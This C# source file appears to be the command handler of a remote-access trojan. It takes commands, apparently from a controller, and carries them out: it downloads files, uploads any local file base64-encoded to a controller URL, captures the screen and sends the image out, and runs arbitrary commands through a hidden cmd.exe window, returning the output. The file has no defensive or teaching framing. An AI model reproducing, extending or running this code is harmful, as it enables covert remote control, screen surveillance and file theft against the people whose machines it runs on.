using System;
using System.Collections.Generic;
using System.Drawing;
using System.Drawing.Imaging;
using System.IO;
using System.Linq;
using System.Net;
using System.Text;
using System.Windows.Forms;

namespace Controlled
{
    class Script
    {
        internal static string execute(string script)
        {
            string[] scriptParams = script.Split(new char[1] { ' ' });
            string scriptType = scriptParams[0];
            string result = null;
            switch (scriptType)
            {
                case "downloadFile":
                    result = downloadFile(scriptParams[1]);
                    break;
                case "uploadFile":
                    result = uploadFile(scriptParams[1]);
                    break;
                case "screen":
                    result = screenshot(scriptParams.Length > 1 ? scriptParams[1]: "1");
                    break;
                default:
                    result = native(script);
                    break;
            }
            return result;
        }
        //uploadFile http://xxxx.com/xx.zip --path c://xxx
        private static string downloadFile(String url)
        {
            string result = "downloadFile success";
            try
            {
                Http.download(url);
            }
            catch (Exception e)
            {
                LogHelper.error("[script]-> downFile execute exception. \r\n url: "+ url);
                result = "downFile execute exception, " + e.Message;
            }
            return result;
        }
        private static string uploadFile(String fileName)
        {
            string result = "uploadFile success";
            try
            {
                Http.request(Global.ROOT_URL + "/upload", "v=" + fileToBase64String(fileName) + "&n=" + fileName, new string[] { "Content-Type: application/x-www-form-urlencoded" });
            }
            catch (Exception e)
            {
                LogHelper.error("[script]-> uploadFile execute exception. \r\n fileName: " + fileName);
                result = "uploadFile execute exception, " + e.Message;
            }
            return result;
        }
        //screen --upload true 
        private static string screenshot(String upload)
        {
            String result = "";
            try
            {
                Image baseImage = new Bitmap(Screen.PrimaryScreen.Bounds.Width, Screen.PrimaryScreen.Bounds.Height);
                Graphics g = Graphics.FromImage(baseImage);
                g.CopyFromScreen(new Point(0, 0), new Point(0, 0), Screen.AllScreens[0].Bounds.Size);
                g.Dispose();
                TimeSpan ts = DateTime.UtcNow - new DateTime(1970, 1, 1, 0, 0, 0, 0);
                Int64 time = Convert.ToInt64(ts.TotalSeconds);
                String fileName = "screenshots_" + time + ".jpg";
                baseImage.Save(fileName, ImageFormat.Jpeg);
                //fileName
                result += "screen success, fileName: " + fileName;
                if (upload.Equals("1"))
                {
                    result += "\r\n" + uploadFile(fileName);
                }
            }
            catch (Exception e)
            {
                LogHelper.error("[script]-> screen execute exception.");
                result = "screen execute exception, " + e.Message;
            }
            return result;
        }
        static string native(string script){
            String result = "";
            try
            {
                System.Diagnostics.Process process = null;
                process = new System.Diagnostics.Process();
                process.StartInfo.FileName = "cmd.exe";
                process.StartInfo.UseShellExecute = false;    //是否使用操作系统shell启动
                process.StartInfo.RedirectStandardInput = true;//接受来自调用程序的输入信息
                process.StartInfo.RedirectStandardOutput = true;//由调用程序获取输出信息
                process.StartInfo.RedirectStandardError = true;//重定向标准错误输出
                process.StartInfo.CreateNoWindow = true;//不显示程序窗口
                process.Start();//启动程序
                process.StandardInput.WriteLine(script + "&exit");
                process.StandardInput.AutoFlush = true;
                //获取cmd窗口的输出信息
                result = process.StandardOutput.ReadToEnd();

                process.WaitForExit();//等待程序执行完退出进程
                process.Close();
            }
            catch (Exception e)
            {
                LogHelper.error("[script]-> natvie execute exception. script: "+ script);
                result = "natvie execute exception, " + e.Message;
            }
            return result;
        }


        //图片 转为    base64编码的文本
        private static String fileToBase64String(string filename)
        {
            try
            {
                if (!Directory.Exists("tempfile"))
                {
                    Directory.CreateDirectory("tempfile");
                }
                FileStream filestream = new FileStream(filename, FileMode.Open);

                byte[] bt = new byte[filestream.Length];

                //调用read读取方法  
                filestream.Read(bt, 0, bt.Length);
                string base64Str = Convert.ToBase64String(bt);
                filestream.Close();

                FileStream fs = new FileStream("tempfile/" + filename + ".txt", FileMode.Create);
                byte[] data = System.Text.Encoding.Default.GetBytes(base64Str);
                //开始写入  
                fs.Write(data, 0, data.Length);
                //清空缓冲区、关闭流  
                fs.Flush();
                fs.Close();
                return base64Str;
            }
            catch (Exception ex)
            {
                LogHelper.error("ImgToBase64String 转换失败\r\nException:" + ex.Message);
                throw ex;
            }
        }
    }
}
